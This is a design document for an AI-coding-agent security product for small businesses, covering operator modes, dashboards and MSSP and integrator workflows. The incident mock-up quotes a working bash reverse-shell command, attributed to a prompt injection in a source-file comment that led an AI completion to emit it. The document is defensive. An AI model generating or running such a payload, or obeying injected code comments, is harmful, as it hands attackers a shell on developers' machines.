# Security Layer-Basis — SMB Edition
## High-Level Architecture & User Experience Design

**Version:** 1.0  
**Date:** 2026-04-19  
**Audience:** SMB organizations (10–500 developers) managed by MSSP, System Integrator, or internal IT Admin

---

## Design Principle

> **SMBs don't have a security team. They have a person.**
>
> This architecture is built around that reality. One IT admin, or one MSSP analyst managing 15 clients, needs the same security outcomes as a Fortune 500 SOC — without the headcount or the complexity.
> The system does the thinking. The human makes the calls.

---

## 1. The Three Operator Modes

Security Layer-Basis for SMB supports three control models — same product, different operator:

```
┌───────────────────────────────────────────────────────────────────────┐
│                   WHO CONTROLS THE POLICY?                            │
│                                                                       │
│   ┌─────────────────┐  ┌──────────────────┐  ┌──────────────────┐   │
│   │   MSSP Mode     │  │   SI Mode        │  │  Admin Mode      │   │
│   │                 │  │                  │  │                  │   │
│   │ MSSP manages    │  │ SI deploys +     │  │ In-house IT or   │   │
│   │ policy + alerts │  │ hands off to     │  │ founder-level    │   │
│   │ for N clients   │  │ client admin     │  │ admin manages    │   │
│   │                 │  │                  │  │ their own org    │   │
│   │ Client sees:    │  │ Client sees:     │  │ Admin sees:      │   │
│   │ monthly reports │  │ their own dash   │  │ full dashboard   │   │
│   │ + incident      │  │ + SI escalation  │  │ + self-service   │   │
│   │ notifications   │  │ path             │  │ policy editor    │   │
│   └─────────────────┘  └──────────────────┘  └──────────────────┘   │
└───────────────────────────────────────────────────────────────────────┘
```

All three modes share the same underlying detection engine and policy format.
The difference is **who sees what** and **who acts on alerts**.

---

## 2. Full System Map (SMB Edition)

```
════════════════════════════════════════════════════════════════════════════════
  DEVELOPER LAYER  (they never see this system exists)
════════════════════════════════════════════════════════════════════════════════

  ┌──────────────────────────────────────────────────────────────────────┐
  │  Developer Machine (any OS)                                          │
  │                                                                      │
  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────────┐   │
  │  │ VS Code  │  │  Cursor  │  │JetBrains │  │  Claude Code /   │   │
  │  │          │  │          │  │          │  │  Codex CLI       │   │
  │  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────────┬─────────┘   │
  │       └─────────────┴──────────────┴─────────────────┘             │
  │                              │                                      │
  │                 ┌────────────▼──────────────┐                      │
  │                 │   Silent Background Agent  │  ← installed via     │
  │                 │   (< 10MB, auto-start)     │    MDM / IT script   │
  │                 │                            │    first time only   │
  │                 │   Captures → strips PII    │                      │
  │                 │   → forwards events        │                      │
  │                 └────────────┬───────────────┘                      │
  └──────────────────────────────┼───────────────────────────────────────┘
                                 │  mTLS / encrypted
                                 ▼
════════════════════════════════════════════════════════════════════════════════
  DETECTION LAYER  (cloud-hosted, zero infra for SMB)
════════════════════════════════════════════════════════════════════════════════

                 ┌────────────────────────────────────┐
                 │        Detection Engine             │
                 │                                    │
                 │  ▸ Real-time event analysis        │
                 │  ▸ Policy enforcement              │
                 │  ▸ Skill identity check (Tego)     │
                 │  ▸ HITL + multi-agent tracking     │
                 │  ▸ Threat intel feed               │
                 │                                    │
                 │  Verdict in < 50ms                 │
                 └────────────┬───────────────────────┘
                              │
              ┌───────────────┼─────────────────┐
              ▼               ▼                 ▼
       Developer          Alert Bus         Audit Store
       (BLOCK/WARN        (real-time        (immutable,
        message in         to operator)      90-day
        their IDE)                           retention)
              │               │                 │
              └───────────────┴─────────────────┘
                              │
════════════════════════════════════════════════════════════════════════════════
  OPERATOR LAYER  (MSSP / SI / Admin — the human who manages security)
════════════════════════════════════════════════════════════════════════════════

  ┌──────────────────────────────────────────────────────────────────────┐
  │                       OPERATOR CONSOLE                               │
  │                                                                      │
  │  ┌─────────────────┐  ┌──────────────────┐  ┌──────────────────┐  │
  │  │  CLIENT LIST    │  │  POLICY EDITOR   │  │  ALERT TRIAGE    │  │
  │  │  (MSSP view)    │  │  (single YAML)   │  │  (SOC lite)      │  │
  │  │                 │  │                  │  │                  │  │
  │  │  AcmeCorp  🟢  │  │  + Add rule      │  │  🔴 CRITICAL  3  │  │
  │  │  BetaCo   🟡  │  │  - Remove rule   │  │  🟠 HIGH      7  │  │
  │  │  GammaTech 🔴  │  │  Deploy → all    │  │  🟡 MEDIUM   12  │  │
  │  │  DeltaInc  🟢  │  │  clients         │  │                  │  │
  │  └─────────────────┘  └──────────────────┘  └──────────────────┘  │
  │                                                                      │
  │  ┌──────────────────────────────────────────────────────────────┐  │
  │  │                    RISK SUMMARY (per client)                  │  │
  │  │   Developers: 24   Events today: 4,821   Blocked: 3          │  │
  │  │   Top risk: reverse shell attempt (dev: d_hashed_9a3f)       │  │
  │  │   Skill alerts: 2 unregistered skills loaded                  │  │
  │  └──────────────────────────────────────────────────────────────┘  │
  └──────────────────────────────────────────────────────────────────────┘
```

---

## 3. User Flows

### 3.1 — Developer Experience (zero friction by design)

```
  DAY 1 — Onboarding
  ──────────────────
  IT Admin sends link → developer runs one installer script (< 2 min)
  Background agent starts silently — no reboot, no IDE restart needed
  Developer opens VS Code / Cursor — nothing looks different

  NORMAL DAY — Happy path
  ───────────────────────
  Developer writes code with Copilot / Cursor AI
        │
        ▼
  Agent captures events invisibly (async, < 1ms)
        │
        ▼
  Detection engine evaluates → ALLOW
        │
        ▼
  Nothing happens. Developer never knows the system exists.

  WARN EVENT — Non-blocking nudge
  ────────────────────────────────
  Developer's AI agent suggests a risky dependency
        │
        ▼
  Detection engine → WARN verdict
        │
        ▼
  Small yellow banner appears in IDE:
  ┌────────────────────────────────────────────────────────┐
  │ ⚠️  Security notice: This package has a known risk     │
  │     flag from your organization's policy.             │
  │     You can still proceed. [Dismiss]  [Learn more]    │
  └────────────────────────────────────────────────────────┘
  Developer can dismiss and continue. Event logged.

  BLOCK EVENT — Hard stop
  ────────────────────────
  AI agent tries to generate a reverse shell payload
        │
        ▼
  Detection engine → BLOCK verdict (< 50ms)
        │
        ▼
  Action is suppressed. IDE shows:
  ┌────────────────────────────────────────────────────────┐
  │ 🚫  This action was blocked by your organization's    │
  │     AI security policy.                               │
  │     Reference: Policy rule RS-001                     │
  │     Questions? Contact your IT admin.    [OK]         │
  └────────────────────────────────────────────────────────┘
  No code generated. No data leaked. Developer sees a clear,
  non-threatening message. No help desk ticket needed.
```

---

### 3.2 — IT Admin Experience (SMB self-managed)

```
  FIRST LOGIN — Setup wizard (30 minutes, no security expertise needed)
  ─────────────────────────────────────────────────────────────────────

  Step 1: Connect your org
  ┌──────────────────────────────────────────────────────────────────┐
  │  How do your developers work?                                    │
  │  ☑ VS Code    ☑ Cursor    ☐ JetBrains    ☑ Claude Code CLI     │
  │                                              [Continue →]        │
  └──────────────────────────────────────────────────────────────────┘

  Step 2: Choose your posture
  ┌──────────────────────────────────────────────────────────────────┐
  │  Pick your security posture:                                     │
  │                                                                  │
  │  ○ Relaxed    Block only confirmed attacks. Warn on everything   │
  │               else. Minimal friction.                            │
  │                                                                  │
  │  ● Balanced   Block confirmed attacks + high-risk skills.        │
  │               Warn on medium risks. (Recommended for SMB)        │
  │                                                                  │
  │  ○ Strict     Block High + Critical. Require approval for        │
  │               new AI tools. Full audit.                          │
  │                                              [Continue →]        │
  └──────────────────────────────────────────────────────────────────┘

  Step 3: Deploy to developers
  ┌──────────────────────────────────────────────────────────────────┐
  │  Deploy the agent to your team:                                  │
  │                                                                  │
  │  ○ MDM push (Jamf / Intune / Mosyle) — one click, zero dev touch│
  │  ● Email invite — developers run a one-liner                    │
  │  ○ Manual download                                               │
  │                                                                  │
  │  → Copy install script:                                          │
  │    curl -sSL https://slb.io/install | sh -s -- --token YOUR_ORG │
  │                                              [Deploy →]          │
  └──────────────────────────────────────────────────────────────────┘

  DAILY ADMIN VIEW — Morning check (5 minutes)
  ─────────────────────────────────────────────

  ┌──────────────────────────────────────────────────────────────────┐
  │  🏠  Security Layer-Basis — AcmeCorp                  Today ▼   │
  │                                                                  │
  │  📊  YESTERDAY AT A GLANCE                                       │
  │  ┌────────────┬──────────────┬──────────┬────────────────────┐  │
  │  │ Developers │ AI Events    │ Blocked  │ Risks Detected     │  │
  │  │   active   │  captured    │          │                    │  │
  │  │    18/24   │   12,440     │    2     │  1 HIGH · 4 MEDIUM │  │
  │  └────────────┴──────────────┴──────────┴────────────────────┘  │
  │                                                                  │
  │  🔴  ACTION NEEDED (1)                                           │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │  Reverse shell attempt blocked                           │   │
  │  │  Developer: [view] · IDE: Cursor · Rule: RS-001          │   │
  │  │  Time: Yesterday 16:42 · Repo: payments-api              │   │
  │  │                                [View full incident →]    │   │
  │  └──────────────────────────────────────────────────────────┘   │
  │                                                                  │
  │  🟡  ADVISORIES (4)                                              │
  │  ▸ 2 unregistered AI skills detected (new tools in use)         │
  │  ▸ 1 developer using an unapproved MCP server                   │
  │  ▸ 1 high-risk package suggested (blocked, dev notified)        │
  │                                          [Review all →]          │
  └──────────────────────────────────────────────────────────────────┘

  INCIDENT DRILL-DOWN — What really happened
  ───────────────────────────────────────────

  ┌──────────────────────────────────────────────────────────────────┐
  │  Incident: RS-001 · Reverse Shell Attempt                        │
  │  Severity: CRITICAL · Status: Blocked automatically             │
  │                                                                  │
  │  Timeline                                                        │
  │  16:41:03  Developer opened checkout.py in Cursor               │
  │  16:41:44  AI completion requested (prompt about debugging)      │
  │  16:41:44  Completion response contained shell payload           │
  │  16:41:44  ← BLOCKED — response never reached the developer     │
  │  16:41:44  Developer shown policy message                        │
  │                                                                  │
  │  What was caught:                                                │
  │  bash -i >& /dev/tcp/[REDACTED]/4444 0>&1                       │
  │  (payload hash: sha256:3f9a...)                                  │
  │                                                                  │
  │  Likely cause: prompt injection in source file comment           │
  │  Recommended action: Review checkout.py for injected comments    │
  │                                                                  │
  │  [Mark resolved]  [Escalate to MSSP]  [Export for compliance]   │
  └──────────────────────────────────────────────────────────────────┘
```

---

### 3.3 — MSSP Experience (managing N clients from one console)

```
  MSSP CONSOLE — Multi-tenant overview
  ─────────────────────────────────────

  ┌──────────────────────────────────────────────────────────────────┐
  │  🛡️  Security Layer-Basis — MSSP Portal         [+ Add client]  │
  │                                                                  │
  │  CLIENT FLEET OVERVIEW                           Live · 09:15   │
  │  ┌──────────────┬───────┬──────────┬──────┬─────────────────┐  │
  │  │ Client       │ Devs  │ Events/h │ Open │ Risk Level      │  │
  │  │              │ Active│          │ Alerts│                │  │
  │  ├──────────────┼───────┼──────────┼──────┼─────────────────┤  │
  │  │ AcmeCorp     │ 18    │ 521      │  1   │ 🔴 CRITICAL     │  │
  │  │ BetaFinance  │  7    │ 209      │  0   │ 🟢 Clear        │  │
  │  │ GammaTech    │ 34    │ 1,104    │  3   │ 🟠 HIGH         │  │
  │  │ DeltaRetail  │  4    │  88      │  0   │ 🟢 Clear        │  │
  │  │ EpsilonLaw   │ 11    │ 312      │  0   │ 🟡 MEDIUM       │  │
  │  │ ZetaHealth   │ 22    │ 671      │  2   │ 🟠 HIGH         │  │
  │  └──────────────┴───────┴──────────┴──────┴─────────────────┘  │
  │                                                                  │
  │  FLEET ALERTS — requires MSSP action                             │
  │  🔴 AcmeCorp · Reverse shell blocked · 16:42 [Triage →]        │
  │  🟠 GammaTech · 3 unauth MCP servers detected [Triage →]       │
  │  🟠 ZetaHealth · Credential read pattern · 2 devs [Triage →]   │
  │                                                                  │
  │  MSSP ACTIONS                                                    │
  │  [Deploy policy update to all clients]                           │
  │  [Generate monthly reports for all clients]                      │
  │  [Add new threat rule to fleet policy]                           │
  └──────────────────────────────────────────────────────────────────┘

  POLICY MANAGEMENT — Write once, push to N clients
  ──────────────────────────────────────────────────

  ┌──────────────────────────────────────────────────────────────────┐
  │  Policy Manager                                                  │
  │                                                                  │
  │  MSSP Base Policy (applies to all clients)      v2.3 · Apr 19  │
  │  ┌──────────────────────────────────────────────────────────┐   │
  │  │  ✅ Reverse shell detection (RS-001)                     │   │
  │  │  ✅ Credential exfiltration (CE-001)                     │   │
  │  │  ✅ Prompt injection (PI-001a, PI-001b)                  │   │
  │  │  ✅ Unauthorized MCP servers (MCP-001)                   │   │
  │  │  ✅ Skill identity check (SI-001, SI-002)                │   │
  │  │  ✅ Supply chain risk (SC-001)                           │   │
  │  └──────────────────────────────────────────────────────────┘   │
  │                                                                  │
  │  CLIENT OVERRIDES                                                │
  │  ┌───────────────────────────────────────────────────────────┐  │
  │  │  ZetaHealth   + HIPAA mode (stricter data access rules)  │  │
  │  │  EpsilonLaw   + Legal-specific MCP allowlist             │  │
  │  │  GammaTech    + Custom approved agents list              │  │
  │  └───────────────────────────────────────────────────────────┘  │
  │                                                                  │
  │  [Edit base policy]  [Preview changes]  [Deploy to all →]       │
  └──────────────────────────────────────────────────────────────────┘

  MONTHLY CLIENT REPORT — auto-generated
  ───────────────────────────────────────

  ┌──────────────────────────────────────────────────────────────────┐
  │  📄  Security Layer-Basis Monthly Report                         │
  │  Client: AcmeCorp · Period: April 2026                           │
  │                                                                  │
  │  EXECUTIVE SUMMARY                                               │
  │  Your AI security posture remained strong this month.           │
  │  18 active developers. 0 successful attacks. 3 threats blocked. │
  │                                                                  │
  │  EVENTS                        THREATS BLOCKED                   │
  │  Total events:   389,441       Critical:  1 (reverse shell)      │
  │  Blocked:              3       High:      2 (credential access)  │
  │  Warned:              14       All threats blocked automatically │
  │                                                                  │
  │  TOP RISK: Cursor AI suggested malicious shell on Apr 18.       │
  │  Blocked before developer saw it. No action required.           │
  │                                                                  │
  │  COMPLIANCE                                                      │
  │  Audit log: 389,441 events · 90-day retention · exportable      │
  │  SOC 2 evidence: available on request                            │
  │                                                                  │
  │  [Download PDF]  [Send to client]  [Archive]                    │
  └──────────────────────────────────────────────────────────────────┘
```

---

### 3.4 — System Integrator Experience (deploy + hand-off)

```
  SI WORKFLOW — Deploy for a client, configure, hand off
  ───────────────────────────────────────────────────────

  Phase 1: SI deploys (Day 1–2)
  ┌──────────────────────────────────────────────────────────────────┐
  │  SI Project: GammaTech AI Security Deployment                    │
  │                                                                  │
  │  ✅ Step 1: Tenant provisioned                                   │
  │  ✅ Step 2: MDM agent pushed to 34 developer machines            │
  │  ✅ Step 3: Base policy configured (Balanced posture)            │
  │  ✅ Step 4: Custom MCP allowlist for GammaTech internal tools    │
  │  ⏳ Step 5: Validation run (48h shadow mode, no blocks yet)      │
  │  ⬜ Step 6: Full enforcement mode enabled                         │
  │  ⬜ Step 7: Handoff to GammaTech admin + training                │
  └──────────────────────────────────────────────────────────────────┘

  Phase 2: Shadow mode (48h) — see what would have been blocked
  ┌──────────────────────────────────────────────────────────────────┐
  │  Shadow Mode Report — 48h observation                            │
  │                                                                  │
  │  Would have blocked:  7 events                                   │
  │  Would have warned:  23 events                                   │
  │                                                                  │
  │  Top findings:                                                   │
  │  ▸ 3 devs using unapproved MCP servers (internal tools)         │
  │    → Add to allowlist? [Yes, add all] [Review one by one]       │
  │                                                                  │
  │  ▸ 1 unregistered AI skill "custom-sql-helper" in use           │
  │    → Risk score: Unknown. Approve? [Approve] [Block]            │
  │                                                                  │
  │  ▸ 4 warns for web access patterns (standard, no action needed) │
  │                                                                  │
  │  Ready for enforcement? [Enable full enforcement →]              │
  └──────────────────────────────────────────────────────────────────┘

  Phase 3: Handoff — admin gets their own console
  ┌──────────────────────────────────────────────────────────────────┐
  │  GammaTech Admin Console — Powered by Security Layer-Basis      │
  │                         (SI: ReadAccess · Escalate to SI button) │
  │                                                                  │
  │  Admin can:                                                      │
  │  ✅ View all alerts and incidents                                 │
  │  ✅ Approve / reject new AI tools used by devs                   │
  │  ✅ Generate compliance reports                                   │
  │  ✅ Adjust warn/block thresholds                                  │
  │  ✅ Add developers, remove leavers                               │
  │                                                                  │
  │  Admin cannot (requires SI):                                     │
  │  🔒 Modify core detection rules                                  │
  │  🔒 Change base policy structure                                 │
  │  🔒 Access other clients' data                                   │
  └──────────────────────────────────────────────────────────────────┘
```

---

## 4. Experience Design Principles (SMB-Specific)

### For Developers
| Principle | Implementation |
|-----------|---------------|
| **Invisible by default** | No UI, no login, no setup — just works after IT installs |
| **Friction only when it matters** | WARN = dismissible banner. BLOCK = clear message, no jargon. |
| **No blame culture** | Messages say "blocked by policy", never "you did something wrong" |
| **Fast** | Verdicts in < 50ms — developer never waits |

### For Admins (SMB IT generalist)
| Principle | Implementation |
|-----------|---------------|
| **No security expertise required** | Posture selector (Relaxed / Balanced / Strict) — not rule writing |
| **5-minute daily check** | Dashboard designed for a morning scan, not a full-time job |
| **Plain English** | Incidents explained in plain language: "What happened, what was stopped, what to do" |
| **Guided actions** | Every alert ends with a recommended next step |
| **Compliance without effort** | Audit logs auto-retain for 90 days. Reports auto-generate monthly. |

### For MSSP Analysts
| Principle | Implementation |
|-----------|---------------|
| **Client fleet at a glance** | Single pane showing all clients, risk levels, open alerts |
| **Write policy once** | MSSP base policy + per-client overrides — push to all in one click |
| **Automated reporting** | Monthly reports auto-generated per client, ready to white-label |
| **Escalation paths clear** | Every client admin sees "Escalate to MSSP" button in their console |
| **Margin-friendly** | Low analyst time per client — system handles the noise, humans handle the exceptions |

### For System Integrators
| Principle | Implementation |
|-----------|---------------|
| **Fast deployment** | MDM push or one-liner script — full org in < 2 hours |
| **Shadow mode** | 48h observation before enforcement — tune before go-live |
| **Clean handoff** | Admin console with SI read-access and escalation path |
| **White-label ready** | Branding, domain, and report templates configurable per SI |

---

## 5. Deployment Architecture (SMB — Zero Infra)

```
┌────────────────────────────────────────────────────────────────────────┐
│                   WHAT SMB ACTUALLY DEPLOYS                            │
│                                                                        │
│  On developer machines:                                                │
│  ┌──────────────────────────────────────────────────────────────┐     │
│  │  1 lightweight background agent (< 10MB)                     │     │
│  │  Installed by: MDM push / one-liner / email invite           │     │
│  │  Maintained by: auto-update (no IT intervention)             │     │
│  └──────────────────────────────────────────────────────────────┘     │
│                                                                        │
│  On-premise infrastructure needed:       NONE                          │
│                                                                        │
│  Cloud-hosted by Security Layer-Basis:                                 │
│  ┌──────────────────────────────────────────────────────────────┐     │
│  │  ▸ Detection Engine (multi-tenant, isolated per org)          │     │
│  │  ▸ Audit Store (90-day retention, SOC 2 compliant)           │     │
│  │  ▸ Operator Console (web app)                                 │     │
│  │  ▸ Threat Intel Feed (auto-updated)                           │     │
│  │  ▸ Tego Skill Registry (auto-updated)                         │     │
│  └──────────────────────────────────────────────────────────────┘     │
│                                                                        │
│  Monthly cost model (SMB):                                             │
│  Base platform + per developer seat                                    │
│  No usage fees. No infra costs. No FTE required.                       │
└────────────────────────────────────────────────────────────────────────┘
```

---

## 6. Capability Matrix by Operator Mode

| Capability | Admin (Self) | SI Mode | MSSP Mode |
|------------|:-----------:|:-------:|:---------:|
| Developer onboarding | ✅ Self-serve | ✅ SI handles | ✅ MSSP handles |
| Posture selection | ✅ | ✅ SI configures | ✅ MSSP configures |
| Alert triage | ✅ | ✅ Admin + SI escalation | ✅ MSSP primary |
| Policy editing | ✅ (guided) | 🔒 SI only | 🔒 MSSP only |
| Core rule modification | ❌ | ✅ SI | ✅ MSSP |
| Per-client overrides | N/A | ✅ | ✅ |
| Multi-client fleet view | N/A | ❌ | ✅ |
| Monthly report generation | ✅ Self | ✅ SI generates | ✅ Auto, white-label |
| Compliance export | ✅ | ✅ | ✅ |
| Shadow mode (pre-enforcement) | ❌ | ✅ | ✅ |
| White-label branding | ❌ | ✅ | ✅ |

---

## 7. Summary: The Experience Promise

| Persona | Before | After |
|---------|--------|-------|
| **Developer** | No idea if their AI tools are being exploited | Still no idea — because it just works. Zero change. |
| **IT Admin** | No visibility into AI agent risk. Too complex to manage. | 5-min morning check. Plain English alerts. Self-serve. |
| **MSSP Analyst** | Can't scale AI security across client base. No tooling. | 15-client fleet at a glance. One policy push. Auto-reports. |
| **System Integrator** | AI security is a gap in every client engagement. | A deployable product, not a bespoke engagement. |

---

*Security Layer-Basis SMB Edition — Architecture v1.0*  
*Part of the Security Layer-Basis project suite*
